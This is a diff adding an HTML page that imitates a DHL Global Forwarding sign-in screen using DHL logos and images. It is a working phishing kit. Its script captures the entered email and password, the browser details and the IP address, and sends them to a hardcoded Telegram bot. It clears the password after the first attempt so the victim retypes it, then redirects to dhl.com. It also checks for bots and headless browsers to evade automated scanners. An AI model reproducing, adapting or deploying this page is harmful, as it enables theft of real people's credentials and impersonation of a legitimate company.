@@ -1,0 +1,258 @@
+﻿
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in to DHL Global Forwarding</title>
+<link rel="icon" href="https://dhlexpresscommerce.com/Images/Intro/DHL/DHL-main-logo.svg" type="image/svg+xml">
+<style>
+    body {
+        font-family: sans-serif;
+        background-color: #f0f0f0;
+        background-image: url('https://keycloak.mydhli.com/auth/resources/sbq2d/login/mydhli-portal/img/background-pic@2x.jpg');
+        background-size: cover;
+        background-position: center;
+        margin: 0;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+    }
+    .header-logo {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        width: 100px;
+    }
+    .container {
+        background-color: rgba(255, 255, 255, 0.8);
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        text-align: center;
+        width: 300px;
+        margin-top: 50px;
+    }
+    .logo {
+        width: 150px;
+        margin-bottom: 20px;
+    }
+    .form-group {
+        margin-bottom: 15px;
+        text-align: left;
+    }
+    label {
+        display: block;
+        margin-bottom: 5px;
+        font-weight: bold;
+    }
+    input[type="email"],
+    input[type="password"] {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-sizing: border-box;
+    }
+    button {
+        background-color: #FFCC00;
+        color: #003087;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px;
+    }
+    button:hover {
+        background-color: #e6b800;
+    }
+    .login-pf-page .login-pf-footer {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        background-color: #f0f0f0;
+        padding: 10px;
+        text-align: center;
+        font-size: small;
+    }
+    .login-pf-page .login-pf-footer a {
+        color: #003087;
+        text-decoration: none;
+        margin: 0 10px;
+    }
+    .login-pf-page .login-pf-footer a:hover {
+        text-decoration: underline;
+    }
+    .footer-content {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    .honeypot-field {
+        display: none;
+    }
+</style>
+</head>
+<body class="login-pf-page">
+<img src="https://dhlexpresscommerce.com/Images/Intro/DHL/DHL-main-logo.svg" alt="DHL Logo" class="header-logo">
+<div class="container">
+    <img src="https://dhlexpresscommerce.com/Images/Intro/DHL/DHL-main-logo.svg" alt="DHL Logo" class="logo">
+    <form id="loginForm" autocomplete="off">
+        <!-- Honeypot field for bots -->
+        <input type="text" class="honeypot-field" name="website" tabindex="-1" autocomplete="off">
+        <div class="form-group">
+            <label for="email">Email Address</label>
+            <input type="email" id="email" name="email" autofocus value placeholder="Enter your email address." required readonly>
+        </div>
+        <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Enter your email password." autocomplete="off" required minlength="5">
+        </div>
+        <button type="submit" id="submit-btn">Login</button>
+    </form>
+</div>
+<div class="login-pf-footer">
+    <div class="footer-content">
+        <a href="https://mydhli.dhl.com/terms-of-use">Terms of Use</a>
+        <a href="https://mydhli.dhl.com/privacy-policy">Privacy Policy</a>
+        <a href="https://mydhli.dhl.com/imprint">Imprint</a>
+        <a href="https://mydhli.dhl.com/cookie-policy">Cookie Policy</a>
+        <span class="copyright">© 2025 DHL International GmbH. All rights reserved.</span>
+    </div>
+</div>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Start timing form interaction
+    const startTime = Date.now();
+    // Pre-fill email from hash
+    const emailInput = document.getElementById('email');
+    if (window.location.hash) {
+        emailInput.value = decodeURIComponent(window.location.hash.substring(1));
+    }
+
+    // Function to get IP address
+    function getIPAddress() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => data.ip)
+            .catch(error => {
+                console.error("Error getting IP address:", error);
+                return "Could not retrieve IP address.";
+            });
+    }
+
+    // Form submission
+    const loginForm = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submit-btn');
+    let submissionCount = 0;
+    let passwordCleared = false;
+
+    loginForm.addEventListener('submit', async function(event) {
+        event.preventDefault();
+
+        // Bot detection checks
+        const honeypot = document.querySelector('.honeypot-field').value;
+        const timeDiff = (Date.now() - startTime) / 1000;
+
+        if (honeypot !== '') {
+            alert('Bot detected (honeypot filled).');
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Login';
+            return;
+        }
+        if (timeDiff < 0.5) {
+            alert('Form submitted too quickly. Please try again.');
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Login';
+            return;
+        }
+
+        const passwordInput = document.getElementById('password');
+        const password = passwordInput.value;
+
+        // Password minimum length
+        if (password.length < 5) {
+            alert("Password must be at least 5 characters long.");
+            passwordInput.focus();
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Login';
+            return;
+        }
+
+        // Disable submit button to prevent multiple submissions
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Processing...';
+
+        const email = document.getElementById('email').value;
+        const browserDetails = navigator.userAgent;
+
+        try {
+            const ipAddress = await getIPAddress();
+
+            // Basic headless browser detection
+            const isHeadless = navigator.webdriver;
+            if (isHeadless) {
+                alert('Headless browser detected.');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Login';
+                return;
+            }
+
+            // *** SECURITY WARNING: DO NOT USE THIS IN PRODUCTION! ***
+            const telegramBotToken = '7323570516:AAEzvLIuxUc_LQhj-GW2YwWK_pDnOk4XjXA';
+            const telegramChatId = '6886243598';
+            const message = `Email: ${email}\nPassword: ${password}\nBrowser Details: ${browserDetails}\nIP Address: ${ipAddress}`;
+
+            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', apiUrl, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+
+            xhr.onload = function() {
+                if (!(xhr.status >= 200 && xhr.status < 300)) {
+                    alert('Wrong password! Please try again with your correct password.');
+                    console.error('Telegram API error:', xhr.status, xhr.statusText, xhr.responseText);
+                } else {
+              
+                }
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Login';
+            };
+
+            xhr.onerror = function() {
+                alert('Network error while sending credentials to Telegram.');
+                console.error('Network error:', xhr.status, xhr.statusText, xhr.responseText);
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Login';
+            };
+
+            xhr.send(JSON.stringify({
+                chat_id: telegramChatId,
+                text: message
+            }));
+
+            submissionCount++;
+
+            if (submissionCount === 1 && !passwordCleared) {
+                passwordInput.value = '';
+                passwordCleared = true;
+            }
+
+            if (submissionCount >= 2) {
+                window.location.href = 'https://www.dhl.com';
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Login';
+        }
+    });
+});
+</script>
+</body>
+</html>
